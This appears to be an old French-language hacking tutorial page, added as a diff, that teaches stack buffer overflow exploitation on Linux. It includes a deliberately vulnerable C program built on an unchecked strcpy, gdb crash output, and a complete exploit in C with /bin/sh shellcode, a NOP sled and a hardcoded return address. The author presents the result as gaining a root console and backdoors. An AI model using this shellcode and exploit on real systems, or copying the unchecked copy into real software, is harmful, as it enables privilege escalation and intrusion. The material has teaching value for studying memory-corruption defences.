@@ -1,0 +1,250 @@
+<html>
+<head>
+<title>Hacking - Exploits</title>
+</head>
+<body bgcolor=#000000>
+<center>
+</font>
+<pre>
+<font size=2 color=#ffff00>
+******************************************************************************
+{{{{{{{{{{{{{{{{{{{{{{{{{{  FAIRE DES EXPLOITS }}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+******************************************************************************
+</center> </font> </pre> <font size=3 color=#ffffff>
+<br>
+Qui n'a jamais revé de faire ces propres exploits, hein ?
+Si vous aussi vous etes dans ce cas la eh beh on va essayer de progresser
+ensemble. Le but d'un exploit est d'obtenir des droits quand on est sur
+un OS tel que linux ou WinNt.<br>
+Ici on va le faire avec linux :)<br><br>
+
+Tout d'abord voyons le fonctionnement d'un exploit. Un exploit exploite (eh
+oui :) un buffer overflow (enfin pas toujours mais ici oui). C'est a dire un
+débordement d'un buffer en mémoire.<br>
+Un programme est executé ligne par ligne.<br>
+Une instruction nommé "call" correspond à l'appel d'un fonction. Pour éxécuter
+cette fonction le programme sauve l'adresse de retour sur la pile, éxécute
+la fonction puis revient grace à l'adresse sauvegardée. Le but de l'exploit
+par buffer overflow est de changer cette adresse mémoire en écrivant là où
+normalement on a pas le droit.<br>
+Si un programme reçoit une chaine de caractere (buffer) comme
+parametre, voila ce que ça donnerait en mémoire: (le buffer est une suite de A ici)
+<font size=3 color=#0000FF>
+<pre>
+MEMORY:)<br>
+-------------------------------------------------------------------------------
+#BUFFER#                              #PILE#
+AAAAAAAAAAAAAAAAAA                    |RET|???????...
+-------------------------------------------------------------------------------
+</pre></font>
+Enfin c'est ça TRES GROSSIEREMENT ! Mais bon bref. le principe est de faire
+déborder le buffer et de changer la valeur de retour de call sur la pile:
+<font size=3 color=#0000FF>
+<pre>
+MEMORY:)
+-------------------------------------------------------------------------------
+#BUFFER#                              #PILE#
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|AAAA|AAAAAAAAAAAAAAAAAA
+-------------------------------------------------------------------------------
+</pre></font>
+Le buffer qu'on a rempli de "AAAA" a débordé et a atteind la valeur de retour.
+Le but est de mettre la valeur qu'on veut dedans pour l'envoyer sur un bout
+de programme codé par nos soins (ce que l'on appelle shellcode et qui sera
+placé au début du buffer).<br><br>
+
+Voyons tout de suite un exemple concret.<br><br>
+
+créez le fichier exemple.c et mettez ceci dedans:<br>
+
+<pre>
+<font size=2 color=#ffff00>
+
+//-----------------------------
+// BO exemple - Hccc
+//-----------------------------
+
+void function(char *str)
+{ 
+	char buffer[100];
+	strcpy(buffer,str);
+} 
+
+main(int argc, char *argv[])  
+{
+	if (argc == 2)
+	{
+		function(argv[1]);
+	}
+}
+
+//-----------------------------
+
+</pre></font>
+
+puis vous le compilez avec gcc:<br>
+gcc exemple.c -o exemple<br>
+(le recompilez pas car le code compilé varie selon votre version de gcc,
+utilisez l'exemple précompilé)<br>
+Vous obtenez un bel éxecutable pour ce minuscule rogramme en c.<br>
+Le programme appelle une fonction qui va copier l'argument envoyé au
+programme lors de son éxecution dans un buffer d'une capacité de 100
+caractères.<br><br>
+
+éxecutez le normalement:<br>
+<font size=3 color=#0000FF>
+<pre>
+------------------------------------------------------------------------
+
+[root@localhost /root]# /root/Desktop/exemple
+[root@localhost /root]# /root/Desktop/exemple 1111111111111111111111111111
+
+c'est bon il plante pas. Maintenant faisons déborder le buffer: 
+
+[root@localhost /root]# /root/Desktop/exemple `perl -e 'print "A" x 200'`
+Erreur de segmentation (core dumped)
+
+-------------------------------------------------------------------------
+</pre></font>
+
+Eh oui il plante, ça veut dire qu'on a bien fait déborder le buffer. le truc
+en perl c'est pour éxécuter le programme exemple avec 200 A en argument.<br>
+on va tenter d'exploiter cette faille.<br>
+C'est ici qu'on va normalement utiliser gdb. Mais là comme c'est mon programme
+et bien on en réécrit un qui nous simplifie la vie:<br>
+<pre>
+<font size=2 color=#ffff00>
+
+-------------------------------------------------------------------------
+
+//-----------------------------
+// BO exemple - Hccc
+//-----------------------------
+
+unsigned long get_sp(void) {__asm__("movl %esp,%eax");}
+
+void function(char *str)
+{ 
+	char buffer[100];
+	strcpy(buffer,str);
+
+	system("clear");
+	printf("\nJe te donne tout pour que tu m'exploites facilement :\n");
+	printf("-----------------------------------------------------\n\n");
+	printf("Debut du buffer    : %x\n",buffer);
+	printf("Fin du buffer      : %x\n",buffer+100);
+	printf("Valeur de ESP      : %x\n",get_sp());
+	printf("Contenu du buffer  : %s\n\n\n",buffer);
+
+} 
+
+main(int argc, char *argv[])  
+{
+	if (argc == 2)
+	{
+		function(argv[1]);
+	}
+}
+
+-------------------------------------------------------------------------
+</pre></font>
+
+On fait un petit : ./exemple `perl -e 'print "A"x108'`<br>
+et ça nous donne ceci :<br>
+(108 car le ret est juste après le 104 dans cet exemple, comme vous me croyez
+pas regardez sous gdb:<br>
+<font size=3 color=#0000FF>
+<pre>
+[root@localhost Desktop]# gdb -q exemple
+(gdb) run `perl -e 'print "A"x108'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+</pre></font>
+
+bon on me crois maintenant ...)<br><br>
+<font size=3 color=#0000FF>
+<pre>
+Je te donne tout pour que tu m'exploites facilement :
+-----------------------------------------------------
+ 
+Debut du buffer    : bffff8e8
+Fin du buffer      : bffff94c
+Valeur de ESP      : bffff8c4
+Contenu du buffer  : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+</pre></font>
+
+on a tout en main pour détourner l'éxécution de ce cher programme.<br>
+petite explication. En faisant déborder le buffer on écrase la valeur de
+retour de call. Cette valeur sera écrite entre 104 et 108.<br>
+voila. Dans le buffer en hexa il faudra inverser l'adresse (ce qui est logique
+si on réfléchit un peu).<br>
+L'adresse :bffff8e8 donnera : e8f8ffbf. C'est bon on code l'exploit qui
+éxécutera le programme avec notre buffer.<br><br>
+
+petit problème: après avoir codé l'exploit on se rend compte que le fait de
+l'éxécuter extérieurement change l'adresse du début du buffer qui se retrouve
+en bffffde8. ça change tout !<br><br>
+
+On va donc changer l'adresse de retour, mais a quoi ça sert ?<br>
+Eh bien on va mettre du code au début du buffer qui sera éxécuté lors du<br>
+retour. Ce code sera le lancement de la console du root car comme ça, à nous
+les maxi-privilèges :)<br>
+Ce bout de code se nomme shellcode, et je dois avouer que je l'ai rippé :)<br><br>
+
+Voila donc le code de l'exploit:<br>
+(compilation : gcc exploite.c -o exploite)<br>
+<pre>
+<font size=2 color=#ffff00>
+-----------------------------------------------------
+
+#include &lt;stdlib.h&gt;
+
+main(int argc, char *argv[]) 
+{
+
+char *args[2];
+
+args[2]=NULL;
+args[1]= 
+
+   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
+   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
+   "\x80\xe8\xdc\xff\xff\xff/bin/sh"              //45 chars
+   
+   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      // les NOPS = 55 chars
+   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      // soit 100 chars au total 
+   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+   "\x90\x90\x90\x90\x90"
+   "\x90\x90\x90\x90"   //104 chars
+
+   "\xe8\xfd\xff\xbf"
+   "\x00";                                        //le 0 final
+
+ 	if (argc != 2)
+	{
+		printf("Usage : Exploite <ProgName>\n");
+	}
+//printf(args[1]);
+execve(argv[1],args,0);
+}
+
+-----------------------------------------------------
+</pre></font>
+
+codé bien à l'ancienne pour bien comprendre :). Executez l'exploit comme
+ceci:<br><br>
+
+./exploite exemple<br><br>
+
+Bim la console du super utilisateur apparait :) ! ObJeCtiF DeStRoYeD !<br>
+A vous les backdoors exploitables :))))
+
+<font size=3 color=#ffff00><br><br>
+<center>
+<pre>TiPiaX/VDS</pre>
+<br>
+</font></body></html>
